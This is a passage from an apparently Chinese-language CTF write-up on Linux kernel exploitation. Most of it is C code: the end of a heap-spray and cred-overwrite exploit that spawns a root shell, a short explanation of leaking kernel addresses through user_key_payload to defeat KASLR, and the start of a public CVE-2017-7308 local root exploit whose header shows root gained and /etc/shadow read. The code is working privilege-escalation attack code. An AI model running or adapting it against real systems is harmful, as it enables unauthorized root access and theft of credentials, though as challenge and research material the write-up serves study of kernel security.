class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">cpu_set_t</span> my_set;</span><br><span class="line">CPU_ZERO(&amp;my_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_root</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// We can&#x27;t simple check uid, since we&#x27;re running inside a namespace</span></span><br><span class="line"><span class="comment">// with uid set to 0. Try opening /etc/shadow instead.</span></span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/root/flag&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_fork</span><span class="params">(<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>( is_root() )&#123;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">               &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer,<span class="number">0</span>, <span class="number">0x110</span>);</span><br><span class="line">    <span class="type">int</span> s = oob_setup(<span class="number">0x4780</span><span class="number">-0x8</span>);</span><br><span class="line">    spray_fork(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        oob_write(buffer, <span class="number">48</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(is_root())&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line">    setup_sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    spray_fork(<span class="number">0x150</span>);</span><br><span class="line">    pagealloc_pad(PAGEALLOC_PAD);</span><br><span class="line"></span><br><span class="line">    spray_cred();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="开启KALSR"><a href="#开启KALSR" class="headerlink" title="开启KALSR"></a>开启KALSR</h3><p>出题人想要考察的就是kaslr状态下面的信息泄漏，只不过失误了。这里就需要一些特殊的结构体进行信息的泄漏了。我们看一下exp中给出的方法。</p><p>exp中使用了user_key_payload这个结构体来进行内存的泄漏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="type">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是如果我们利用未开启kaslr中的堆喷射和堆溢出覆写datalen为一个很大的长度，那么在进行数据读取的时候就会泄漏出当前结构体之后的一些内容，在这些内容中也可能存在一些内核的地址。当然我们也可以在这个结构体之后分配一个包含有内核信息的结构体，做到如果有泄漏就一定有内核地址的程度。</p><p>但是由于user_key_payload这个结构体分配的时候是从kmalloc_256这个slab中分配的占用的是一个页面，因此有时候会发生ring_buffer之后的一个页面被其他slab申请的情况，也就是ring_buffer和kmalloc_256这个slab的freelist指向的页面不相邻，也就是会有写入失败的情况发生。不知道是怎么回事我在调试的时候一次都没有成功过，但是直接执行的话倒是可以成功。</p><p>泄漏的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A proof-of-concept local root exploit for CVE-2017-7308.</span></span><br><span class="line"><span class="comment">// Includes a SMEP &amp; SMAP bypass.</span></span><br><span class="line"><span class="comment">// Tested on 4.8.0-41-generic Ubuntu kernel.</span></span><br><span class="line"><span class="comment">// &lt;https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ gcc pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ ./pwn</span></span><br><span class="line"><span class="comment">// [.] starting</span></span><br><span class="line"><span class="comment">// [.] namespace sandbox set up</span></span><br><span class="line"><span class="comment">// [.] KASLR bypass enabled, getting kernel addr</span></span><br><span class="line"><span class="comment">// [.] done, kernel text:   ffffffff87000000</span></span><br><span class="line"><span class="comment">// [.] commit_creds:        ffffffff870a5cf0</span></span><br><span class="line"><span class="comment">// [.] prepare_kernel_cred: ffffffff870a60e0</span></span><br><span class="line"><span class="comment">// [.] native_write_cr4:    ffffffff87064210</span></span><br><span class="line"><span class="comment">// [.] padding heap</span></span><br><span class="line"><span class="comment">// [.] done, heap is padded</span></span><br><span class="line"><span class="comment">// [.] SMEP &amp; SMAP bypass enabled, turning them off</span></span><br><span class="line"><span class="comment">// [.] done, SMEP &amp; SMAP should be off now</span></span><br><span class="line"><span class="comment">// [.] executing get root payload 0x401516</span></span><br><span class="line"><span class="comment">// [.] done, should be root now</span></span><br><span class="line"><span class="comment">// [.] checking if we got root</span></span><br><span class="line"><span class="comment">// [+] got r00t ^_^</span></span><br><span class="line"><span class="comment">// root@ubuntu:/home/user# cat /etc/shadow</span></span><br><span class="line"><span class="comment">// root:!:17246:0:99999:7:::</span></span><br><span class="line"><span class="comment">// daemon:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// bin:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Andrey Konovalov &lt;andreyknvl@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/xfrm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DumpHex</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp; ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>) &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i+<span class="number">1</span> == size) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \\n&quot;</span>, ascii);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i+<span class="number">1</span> == size) &#123;</span><br><span class="line">                ascii[(i+<span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i+<span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \\n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line"><span class="comment">// specify using TPACKET_V3 version cause this vulnerability</span></span><br><span class="line"><span class="comment">// only impacts this verison</span></span><br><span class="line"><span class="type">int</span> v = TPACKET_V3;</span><br><span class="line"><span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line"><span class="keyword">if</span> (rv &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;[-] setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line"><span 